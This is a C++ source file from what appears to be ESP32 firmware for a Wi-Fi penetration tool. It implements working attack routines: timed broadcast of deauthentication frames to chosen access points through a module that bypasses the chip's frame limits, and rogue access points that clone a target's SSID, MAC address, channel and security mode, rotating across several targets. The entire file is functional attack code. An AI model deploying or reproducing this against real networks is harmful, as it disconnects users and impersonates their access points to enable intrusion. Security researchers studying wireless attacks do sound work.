/**
 * @file attack_method.c
 * @author risinek (risinek@gmail.com)
 * @date 2021-04-07
 * @copyright Copyright (c) 2021
 *
 * @brief Implements common methods for various attacks
 */
#include "attack_method.h"

#include <cstring>
#include <string>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include <mutex>

#include "esp_err.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "esp_wifi_types.h"
#include "wifi_controller.h"
#include "wsl_bypasser.h"

namespace {
const char* LOG_TAG = "main:attack_method";
esp_timer_handle_t deauth_timer_handle{nullptr};
esp_timer_handle_t rogueap_timer_handle{nullptr};

ap_records_t gApRecordsForBroadcast;

typedef struct {
  bool isAttackInProgress{false};
  uint8_t current_ap_idx{0};
  ap_records_t ap_records;
} multiple_rogue_ap_data_t;
multiple_rogue_ap_data_t gMmultipleRogueApData;
std::mutex gMmultipleRogueApDataMutex;
}  // namespace

extern bool gShouldLimitAttackLogs;

/**
 * @brief Callback for periodic deauthentication frame timer
 *
 * Periodicaly called to send deauthentication frame for given AP
 *
 * @param arg expects structure of type ap_records_t describing ap_records
 */
static void timer_send_deauth_frame(void* arg) {
  ap_records_t* ap_records = (ap_records_t*)arg;

  std::string ap_ssids;
  for (const auto& ap_record : *ap_records) {
    ap_ssids += (const char*)ap_record->ssid;
    ap_ssids += ", ";
  }
  ap_ssids.pop_back();

  if (gShouldLimitAttackLogs) {
    static uint64_t cnt{0};
    if ((cnt % 60) == 0) {
      // Print log only once in 60 times (once per minute)
      ESP_LOGI(LOG_TAG, "Sending deauth frame to APs with SSIDs [%s]", ap_ssids.c_str());
    }
    ++cnt;
  } else {
    ESP_LOGI(LOG_TAG, "Sending deauth frame to APs with SSIDs [%s]", ap_ssids.c_str());
  }

  for (const auto& ap_record : *ap_records) {
    wsl_bypasser_send_deauth_frame(ap_record.get());
  }
}

/**
 * @details Starts periodic timer for sending deauthentication frame via timer_send_deauth_frame().
 */
void attack_method_broadcast(const ap_records_t& ap_records, unsigned period_sec) {
  // Create copy of shared ptrs = share ownership. So, in case someone will rescan APs, these APs will not be deleted
  gApRecordsForBroadcast = ap_records;

  esp_timer_create_args_t deauth_timer_args{};
  deauth_timer_args.callback = &timer_send_deauth_frame;
  deauth_timer_args.arg = (void*)&gApRecordsForBroadcast;

  // Call for the first time
  timer_send_deauth_frame((void*)&ap_records);

  ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
  ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, period_sec * 1000000));
}

void attack_method_broadcast_stop() {
  if (deauth_timer_handle == nullptr) {
    // Nothing to stop
    return;
  }
  if (esp_timer_is_active(deauth_timer_handle)) {
    ESP_ERROR_CHECK(esp_timer_stop(deauth_timer_handle));
  }
  ESP_ERROR_CHECK(esp_timer_delete(deauth_timer_handle));
  deauth_timer_handle = nullptr;
  gApRecordsForBroadcast = {};
}

/**
 * @details Starts offering new Rogue AP in the list
 */
void start_rogue_ap(const wifi_ap_record_t* ap_record) {
  ESP_LOGI(LOG_TAG, "Starting Rogue AP with SSID '%s'", ap_record->ssid);
  wifictl_set_ap_mac(ap_record->bssid);

  static const char dummyPassword[] = "dummypassword";
  wifi_config_t ap_config{};
  mempcpy(ap_config.ap.ssid, ap_record->ssid, 32);
  ap_config.ap.ssid_len = (uint8_t)strlen((char*)ap_record->ssid);
  mempcpy(ap_config.ap.password, dummyPassword, sizeof(dummyPassword));
  ap_config.ap.channel = ap_record->primary;
  ap_config.ap.authmode = ap_record->authmode;
  ap_config.ap.max_connection = 1;
  wifictl_ap_start(&ap_config);
}

/**
 * @brief Callback for periodic Rogue AP timer
 *
 * Periodicaly called to switch to new Rogue AP in the list
 *
 * @param arg expects structure of type multiple_rogue_ap_data_t describing Rogue APs
 */
void timer_change_rogue_ap(void* arg) {
  multiple_rogue_ap_data_t* multiple_rogue_ap_data = (multiple_rogue_ap_data_t*)arg;
  std::shared_ptr<const wifi_ap_record_t> current_wifi_ap_record_ptr;
  {
    std::lock_guard<std::mutex> lock(gMmultipleRogueApDataMutex);
    if (multiple_rogue_ap_data->ap_records.empty()) {
      // Looks like global data structure was deleted.
      return;
    }
    current_wifi_ap_record_ptr = multiple_rogue_ap_data->ap_records[multiple_rogue_ap_data->current_ap_idx];
    ++multiple_rogue_ap_data->current_ap_idx;
    if (multiple_rogue_ap_data->current_ap_idx >= multiple_rogue_ap_data->ap_records.size()) {
      multiple_rogue_ap_data->current_ap_idx = 0;
    }
  }

  // We hold shared_ptr to AP, so, even if rescan will happen in another thread, information about this AP will not be
  // deleted. In similar way, if stop_attack() is called and multiple_rogue_ap_data->ap_records is deleted, we anyway
  // have data, untill we destroy this shared_ptr
  start_rogue_ap(current_wifi_ap_record_ptr.get());
}

/**
 * @brief Starts attack with using multiple Rogue APs
 *
 * Starts periodic timer for switching to new Rogue AP in the list
 *
 * @param ap_records expects structure of type ap_records describing Rogue APs
 * @param per_ap_timeout how long to establish each Rogue AP
 */
void start_multiple_rogue_ap_attack(const ap_records_t& ap_records, uint16_t per_ap_timeout) {
  void* timerData{nullptr};
  {
    std::lock_guard<std::mutex> lock(gMmultipleRogueApDataMutex);
    gMmultipleRogueApData = {};
    gMmultipleRogueApData.isAttackInProgress = true;
    gMmultipleRogueApData.current_ap_idx = 0;
    // Create copy of shared ptrs = share ownership. So, in case someone will rescan APs, these APs will not be deleted
    gMmultipleRogueApData.ap_records = ap_records;
    timerData = &gMmultipleRogueApData;
  }

  esp_timer_create_args_t rogueap_timer_args{};
  rogueap_timer_args.callback = &timer_change_rogue_ap;
  rogueap_timer_args.arg = timerData;
  ESP_ERROR_CHECK(esp_timer_create(&rogueap_timer_args, &rogueap_timer_handle));

  // Call for the first time
  timer_change_rogue_ap(timerData);

  ESP_ERROR_CHECK(esp_timer_start_periodic(rogueap_timer_handle, per_ap_timeout * 1000000));
}

/**
 * @brief Implenebts attack with using one or multiple Rogue APs
 *
 * Check if we should initiate attack on multiple or single AP. Initiates attack.
 *
 * @param ap_records expects structure of type ap_records describing Rogue APs
 * @param per_ap_timeout how long to establish each Rogue AP
 */
void attack_method_rogueap(const ap_records_t& ap_records, uint16_t per_ap_timeout) {
  bool isAttackInProgress{false};
  {
    std::lock_guard<std::mutex> lock(gMmultipleRogueApDataMutex);
    isAttackInProgress = gMmultipleRogueApData.isAttackInProgress;
  }
  if (isAttackInProgress == true) {
    ESP_LOGE(LOG_TAG, "Failed to start RogueAP attack: previous attack is not finished yet");
    return;
  }

  if ((per_ap_timeout != 0) && (ap_records.size() > 1)) {
    // Attack multiple APs
    start_multiple_rogue_ap_attack(ap_records, per_ap_timeout);
    return;
  }

  start_rogue_ap(ap_records[0].get());
}

void attack_method_rogueap_stop() {
  if (rogueap_timer_handle != nullptr) {
    if (esp_timer_is_active(rogueap_timer_handle)) {
      ESP_ERROR_CHECK(esp_timer_stop(rogueap_timer_handle));
    }
    ESP_ERROR_CHECK(esp_timer_delete(rogueap_timer_handle));
    rogueap_timer_handle = nullptr;
  }
  {
    std::lock_guard<std::mutex> lock(gMmultipleRogueApDataMutex);
    gMmultipleRogueApData = {};
  }

  wifictl_mgmt_ap_start();
  wifictl_restore_ap_mac();
}
